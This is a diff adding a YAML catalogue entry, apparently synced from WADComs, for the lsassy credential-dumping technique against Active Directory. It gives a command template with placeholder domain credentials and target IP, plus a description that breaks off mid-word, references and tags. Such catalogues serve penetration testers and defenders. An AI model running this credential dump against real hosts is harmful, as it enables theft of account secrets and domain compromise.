@@ -1,0 +1,31 @@
+id: wadcoms/lsassy-credsdump
+type: technique
+platform: active-directory
+name: lsassy credsdump
+phases:
+- execution
+capabilities:
+- command-execution
+privilege_required: domain-user
+sources:
+- project: WADComs
+  upstream_url: https://wadcoms.github.io
+  license: verify upstream LICENSE
+  upstream_version: a864cd1
+  last_synced: '2026-08-25'
+preconditions:
+- a valid username
+- a valid password
+commands:
+- template: lsassy -u john -p password123 -d test.local 10.10.10.1
+  comment: '"lsassy is a tool written in python released in 2021 to provide a varity of methods to dump
+    credintials from a single/multiple remote targets. It uses a varity of differnt tactics that provide
+    OPSEC benefits in some cases while also providing the operator options in how it execut'
+references:
+- https://en.hackndo.com/remote-lsass-dump-passwords/
+- https://github.com/login-securite/lsassy?tab=readme-ov-file
+tags:
+- active-directory
+- wadcoms
+- kerberos
+- ntlm
